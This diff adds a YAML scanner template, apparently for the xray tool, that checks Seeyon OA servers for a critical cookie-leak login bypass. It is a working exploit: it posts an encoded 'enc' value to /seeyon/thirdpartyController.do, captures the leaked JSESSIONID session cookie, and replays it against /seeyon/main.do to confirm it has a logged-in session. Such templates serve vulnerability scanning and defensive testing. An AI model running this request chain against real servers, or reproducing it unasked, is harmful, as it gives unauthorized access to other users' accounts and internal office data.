@@ -1,0 +1,30 @@
+id: seeyon-oa-cookie-leak-login-bypass
+
+info:
+    name: Seeyon OA Cookie Leakage
+    author: Print1n(http://print1n.top)
+    severity: critical
+    verified: true
+    description: app="Seeyon-A8"
+    reference:
+        - https://mp.weixin.qq.com/s/0AqdfTrZUVrwTMbKEKresg
+
+rules:
+    r0:
+        request:
+            method: POST
+            path: /seeyon/thirdpartyController.do
+            body: method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4
+        expression: response.status == 200 && "JSESSIONID=(.*)".bmatches(response.raw_header)
+        output:
+            search: '"JSESSIONID=(?P<mycookie>.*?);".bsubmatch(response.raw_header)'
+            mycookie: search["mycookie"]
+    r1:
+        request:
+            method: GET
+            path: /seeyon/main.do
+            headers:
+                Cookie: "JSESSIONID={{mycookie}}"
+        expression: response.status == 200 && response.body.bcontains(b"<a href='/seeyon/main.do?method=logout'")
+expression: r0() && r1()
+
